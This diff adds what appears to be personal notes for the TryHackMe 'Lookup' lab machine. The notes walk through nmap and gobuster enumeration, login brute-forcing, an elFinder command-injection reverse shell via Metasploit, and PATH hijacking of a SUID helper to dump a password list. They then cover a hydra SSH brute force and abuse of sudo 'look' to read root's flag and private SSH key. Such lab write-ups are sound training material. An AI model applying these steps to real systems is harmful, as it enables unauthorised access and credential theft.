@@ -1,0 +1,197 @@
+# nmap scan:
+kali@kali:~/Downloads$ nmap -O -A -sV 10.10.91.160
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 16:45 IST
+Nmap scan report for lookup.thm (10.10.91.160)
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login Page
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=4/17%OT=22%CT=1%CU=42845%PV=Y%DS=2%DC=T%G=Y%TM=6800E2F
+OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%
+OS:TS=A)SEQ(SP=FD%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E2ST11NW7%O2=M
+OS:4E2ST11NW7%O3=M4E2NNT11NW7%O4=M4E2ST11NW7%O5=M4E2ST11NW7%O6=M4E2ST11)WIN
+OS:(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F50
+OS:7%O=M4E2NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
+OS:R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
+OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
+OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
+OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   217.64 ms 10.21.0.1
+2   221.87 ms lookup.thm (10.10.91.160)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.34 seconds
+
+
+# gobuster , directort bruteforce
+gobuster dir -u http://lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,xml,js,txt,css,html,cgi,python 
+
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/index.php            (Status: 200) [Size: 719]
+/login.php            (Status: 200) [Size: 1]
+#### after logging in with jose
+new subdomain: files.lookup.thm
+::::: add it to the /etc/hosts
+# on intercepting the login attempt
+we find that ther user "admin" exists, 
+so we try to bruteforce the password.
+
+we find that for the password:password123 the response is different , therefore , we we try to brutefoce the usernames for this password.
+
+so we find the 2nd username : jose
+
+hence :
+username1: admin
+username2: jose :: password :password123
+
+#### We enter a new website 
+
+here we find that we are working on the elfinder 
+upon further finding we find thar the elfider version is 2.4.7
+and we find that it has a vulnerability.
+* * *
+elFinder 2.1.47 - 'PHP connector' Command Injection 
+* * *
+## Get the reverse shell.
+we will use the METASPLOIT , or we anc download the script from the exploit database directly.
+Here we will use the metasploit
+
+# Stabalist the shell.
+1:python3 -c "import pty;pty.spawn('/bin/bash')"
+2: export TERM=xterm
+
+
+NOW:
+WE find that the "user.txt" file is in the /home/think
+but it can not be accessed by other user than  think-user.
+
+
+
+
+www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+
+
+www-data@lookup:/tmp$ cd /tmp
+cd /tmp
+www-data@lookup:/tmp$ echo '#!/bin/bash' > /tmp/pwm-modified     
+echo '#!/bin/bash' > /tmp/pwm-modified
+www-data@lookup:/tmp$ echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/pwm-modified
+echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/pwm-modified
+www-data@lookup:/tmp$ chmod +x /tmp/pwm-modified
+chmod +x /tmp/pwm-modified
+www-data@lookup:/tmp$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@lookup:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/tmp$ mv pwm-modified id
+mv pwm-modified id
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+
+
+#### now we will brute force SSH for think with these passwords.
+add the above passwords list in a file : pass.txt
+
+hydra -l think -P /home/kali/Downloads/TryHackMe/Lookup/pass.txt ssh://lookup.thm:22
+
+
+we will find the password to be:
+josemario.AKA(think)
+
+##
+sudo -l
+ (ALL) /usr/bin/look
+
+ now: ON the gtfobun we find that this is exploitable
+LFILE=/root/root.txt
+sudo look '' "$LFILE"
+5a285a9f257e45c68bb6c9f9f57d18e8
+
+         OOORRRRRR
+ LFILE=/root/.ssh/id_rsa(we are looking for the private root user id)
+sudo look '' "$LFILE"
+
+we will get an private key, we will save it in the separate file
+and use it to log in that way as the root user.
+
